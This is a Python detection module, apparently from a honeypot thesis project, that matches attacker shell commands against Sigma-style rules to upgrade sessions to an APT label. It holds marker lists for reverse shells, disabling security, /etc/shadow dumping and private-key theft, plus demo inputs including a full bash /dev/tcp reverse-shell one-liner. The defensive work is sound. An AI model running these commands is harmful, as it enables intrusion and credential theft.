"""
sigma_rules.py — P8 (2026-09-19): "Sigma-style" detection rules จับพฤติกรรมน่าสงสัยระดับสูงจาก
คำสั่ง shell → ใช้ 2 ทาง:
  1) **one-way upgrade SK/Bot → APT** (real-time, late-firing): APT tell มัก "มาช้า" (probe
     sandbox/ล้าง log/เปิด reverse shell หลัง recon). classifier ล็อกไปแล้วตอน N คำสั่งแรก (P4) แต่ถ้า
     คำสั่งถัดมา trip กฎ "signature ของ APT ชัดๆ" → upgrade เป็น APT (ไม่ downgrade กันสั่น — session_store)
  2) **trip-score** (offline/thesis): ถ่วงน้ำหนักความรุนแรงรวม ใช้บรรยายเชิงปริมาณในเล่ม

ที่มา (design §1.7⑤③ / trackB_classifier_design_2026-09-18): แนวคิด Sigma (github.com/SigmaHQ) =
กฎ detection generic. ที่นี่ทำ subset เล็กเฉพาะพฤติกรรม hands-on-keyboard ที่ bot/kiddie แทบไม่ทำ

**Single source of truth (§5):** reuse ANTI_HP_MARKERS / CLEANUP_ANTIFORENSICS_MARKERS จาก
signal_extractor (ไม่พิมพ์ซ้ำ) + pool ใหม่เฉพาะ signature ที่ยังไม่มี (reverse-shell/disable-sec/cred-dump)

**เกณฑ์ apt_signature (ทำไม upgrade ปลอดภัย):** เลือกเฉพาะกฎ "precision สูง" — พฤติกรรมที่บอท
สคริปต์/มือใหม่แทบไม่ทำ (ล้างร่องรอย, เช็ค VM, reverse shell, ปิด security, dump /etc/shadow, ขโมย
private key). กฎที่บอทก็ทำ (crontab, wget) = apt_signature=False (นับ trip-score ได้ แต่ไม่ trigger upgrade)

รันเป็นสคริปต์: `python sigma_rules.py "<command>"`
"""

from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)
from signal_extractor import ANTI_HP_MARKERS, CLEANUP_ANTIFORENSICS_MARKERS  # noqa: E402

# --- pool ใหม่ (ไม่มีใน signal_extractor) ---
# reverse shell / interactive C2 — เปิด shell กลับหา attacker = hands-on-keyboard ชัด
_REVERSE_SHELL = ("bash -i", "sh -i", "/dev/tcp/", "/dev/udp/", "nc -e", "ncat -e", "mkfifo",
                  "socat ", "socat tcp", "python -c 'import socket", 'python -c "import socket',
                  "import pty", "rm /tmp/f")
# disable/impair security controls (T1562) — ปิด firewall/SELinux/AppArmor/monitoring
_DISABLE_SEC = ("iptables -f", "setenforce 0", "ufw disable", "systemctl stop", "service stop",
                "systemctl disable", "aa-disable", "chattr -i", "pkill -f auditd",
                "systemctl stop firewalld", "getenforce")
# OS credential dumping (T1003) — อ่าน/ดึง hash รหัสผ่าน
_CRED_DUMP = ("cat /etc/shadow", "getent shadow", "unshadow", "/etc/gshadow")
# ขโมย private key / cloud cred เจาะจง (T1552) — targeted secret theft
_SECRET_THEFT = ("id_rsa", ".ssh/id_", ".aws/credentials", ".pgpass", "id_ed25519")
# persistence เจาะจง (T1543/T1098) — ตั้ง persistence แบบตั้งใจ (ไม่ใช่ crontab ที่บอทก็ทำ)
_PERSIST_DELIB = ("authorized_keys", "systemctl enable", "/etc/systemd/system", "update-rc.d",
                  "useradd", "adduser --", "/etc/rc.local")
# commodity (บอท/kiddie ก็ทำ) — นับ trip-score แต่ไม่ trigger upgrade
_DOWNLOAD = ("wget ", "curl ", "tftp", "ftpget")
_CRON = ("crontab", "/etc/cron", "cron.d")

# กฎ: (rule_id, ชื่อ, tactic ATT&CK, severity, apt_signature, markers)
#   severity -> score: low=1 medium=2 high=4 critical=6 (trip-score offline)
#   apt_signature=True = precision สูงพอจะ trigger upgrade SK/Bot->APT ได้เดี่ยวๆ
SEVERITY_SCORE = {"low": 1, "medium": 2, "high": 4, "critical": 6}

RULES: tuple[tuple[str, str, str, str, bool, tuple[str, ...]], ...] = (
    ("anti_forensics",  "Indicator Removal / log clearing",   "Defense Evasion", "high",     True,  CLEANUP_ANTIFORENSICS_MARKERS),
    ("sandbox_evasion", "Virtualization/Sandbox Evasion probe", "Defense Evasion", "high",   True,  ANTI_HP_MARKERS),
    ("reverse_shell",   "Reverse shell / interactive C2",     "Execution",       "critical", True,  _REVERSE_SHELL),
    ("disable_security","Impair Defenses (disable sec ctrl)", "Defense Evasion", "high",     True,  _DISABLE_SEC),
    ("cred_dump",       "OS Credential Dumping (/etc/shadow)","Credential Access","critical",True,  _CRED_DUMP),
    ("secret_theft",    "Private key / cloud credential theft","Credential Access","high",   True,  _SECRET_THEFT),
    ("deliberate_persist","Deliberate persistence (systemd/keys)","Persistence", "high",     True,  _PERSIST_DELIB),
    # ---- commodity: นับ trip-score แต่ apt_signature=False (บอทก็ทำ ไม่ upgrade เดี่ยว) ----
    ("ingress_transfer","Ingress Tool Transfer (download)",   "Command and Control","medium",False, _DOWNLOAD),
    ("scheduled_task",  "Scheduled Task/Job (cron)",          "Persistence",     "medium",   False, _CRON),
)


def _join(commands: list) -> str:
    """รับ list ของ (ts,cmd) หรือ str — คืน string เดียว lower-case (เว้นบรรทัด กัน marker ข้ามคำสั่ง)"""
    parts = []
    for item in commands:
        cmd = item[1] if isinstance(item, tuple) else item
        parts.append((cmd or "").lower())
    return " \n ".join(parts)


def sigma_matches(commands: list) -> list[dict]:
    """คืนรายละเอียดกฎที่ trip: [{rule_id, name, tactic, severity, apt_signature}]"""
    joined = _join(commands)
    out = []
    for rid, name, tactic, sev, apt_sig, markers in RULES:
        if any(m in joined for m in markers):
            out.append({"rule_id": rid, "name": name, "tactic": tactic,
                        "severity": sev, "apt_signature": apt_sig})
    return out


def sigma_trip_score(commands: list) -> int:
    """คะแนนรวมความรุนแรง (offline/thesis) — ผลรวม severity ของกฎที่ trip"""
    return sum(SEVERITY_SCORE[m["severity"]] for m in sigma_matches(commands))


def apt_upgrade_signal(commands: list) -> bool:
    """True ถ้าเจอกฎ apt_signature อย่างน้อย 1 = หลักฐาน APT ชัดพอจะ upgrade (ใช้ real-time ใน
    session_store — ส่ง [command] ตัวเดียวก็ได้ เพราะกฎ signature เดี่ยวก็ชี้ชัด)"""
    return any(m["apt_signature"] for m in sigma_matches(commands))


def _demo() -> None:
    cases = {
        "bot download":  ["wget http://x/a", "chmod +x a", "./a"],
        "kiddie grab":   ["cat /etc/passwd", "crontab -e", "wget http://x/s.sh"],
        "apt evasion":   ["uname -a", "systemd-detect-virt", "history -c"],
        "apt revshell":  ["bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"],
        "apt cred":      ["cat /etc/shadow", "cat ~/.ssh/id_rsa"],
    }
    for name, cmds in cases.items():
        hits = sigma_matches(cmds)
        print(f"{name:14s} upgrade={str(apt_upgrade_signal(cmds)):5s} "
              f"score={sigma_trip_score(cmds):2d}  rules={[h['rule_id'] for h in hits]}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        for m in sigma_matches([sys.argv[1]]):
            print(m)
        print("upgrade_signal:", apt_upgrade_signal([sys.argv[1]]))
    else:
        _demo()
